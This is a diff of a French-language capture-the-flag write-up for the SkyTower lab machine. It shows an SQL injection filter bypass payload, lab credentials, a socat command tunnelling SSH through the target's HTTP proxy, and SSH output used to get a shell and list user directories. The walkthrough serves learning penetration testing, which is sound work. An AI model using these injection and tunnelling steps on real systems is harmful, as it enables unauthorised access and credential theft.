@@ -5,7 +5,7 @@ Skytower is an intermediate level machine
 
 What I learned:
 + SQLi simple filter
-+ HTTP Proxying for ssh
++ HTTP Proxying for ssh with socat
 + ssh commands
 
 
@@ -13,6 +13,11 @@ What I learned:
 
 - Detect SQLi with ' or 5s delay polyglot
 - Exploit SQLi with || and # 
+- Ssh through HTTP tunnel with socat
+- Get DB credentials in /var/www/login.php
+- Get users credentials in DB
+- Ssh through HTTP tunnel with socat
+- sudo
 
 
 ## Nmap
@@ -44,15 +49,63 @@ On utilise || à la place du OR
 a'   || 1=1;  #
 ````
 
-On obtinet un login/pawwd ssh
-Se logguer en ssh à travers le proxy HTTP via CONNECT  grace à socat 
-Lancer une commande /bi/bash via ssh
+![msg](skytower_msg.jpg)
+On obtient un login/passwd ssh
+````
+Username: john
+Password: hereisjohn
+````
+
+## 3228: HTTP proxy
+
+Ouvre un tunnel pour atteindre le port 22: localhost:9999 --- (192.168.56.1.101:3128) ---> 127.0.0.1:22
+````
+socat TCP-LISTEN:9999,reuseaddr,fork PROXY:192.168.56.101:127.0.0.1:22,proxyport=3128
+````
+
+Se connecter en ssh
+````
+$ssh john@localhost -p 9999
+The authenticity of host '[localhost]:9999 ([127.0.0.1]:9999)' can't be established.
+ECDSA key fingerprint is SHA256:QYZqyNNW/Z81N86urjCUIrTBvJ06U9XDDzNv91DYaGc.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[localhost]:9999' (ECDSA) to the list of known hosts.
+john@localhost's password: 
+Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Jun 20 07:41:08 2014
+
+Funds have been withdrawn
+Connection to localhost closed.
+````
+Un exit à la fin du .bashrc nous deconnecte. 
+Lancer une commande /bin/bash via ssh
+````
+ssh john@127.0.0.1 -p 9999 /bin/bash
+The authenticity of host '[127.0.0.1]:9999 ([127.0.0.1]:9999)' can't be established.
+ECDSA key fingerprint is SHA256:QYZqyNNW/Z81N86urjCUIrTBvJ06U9XDDzNv91DYaGc.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[127.0.0.1]:9999' (ECDSA) to the list of known hosts.
+john@127.0.0.1's password: 
+
+id
+uid=1000(john) gid=1000(john) groups=1000(john)
+ls -lR /home
+/home:
+total 12
+drwx------ 2 john    john    4096 Jun 20  2014 john
+drwx------ 2 sara    sara    4096 Jun 20  2014 sara
+drwx------ 2 william william 4096 Jun 20  2014 william
+````
+
 Recupérer les access bdd dans la page php
-Recupérer les credentials dans la bdd
-sudo
-
-
-
+````
 cat /var/www/log*
 <?php
 $db = new mysqli('localhost', 'root', 'root', 'SkyTech');
@@ -101,14 +154,11 @@ echo " <br><br> We wish you the best of luck in your future endeavors. <br> </di
 echo "</HTML>"
 
 ?>
+````
 
 
 
 
-
-
-Username: john
-Password: hereisjohn
 
 socat TCP-LISTEN:9999,reuseaddr,fork PROXY:192.168.1.84:127.0.0.1:22,proxyport=3128
 ssh john@locahost -p 9999
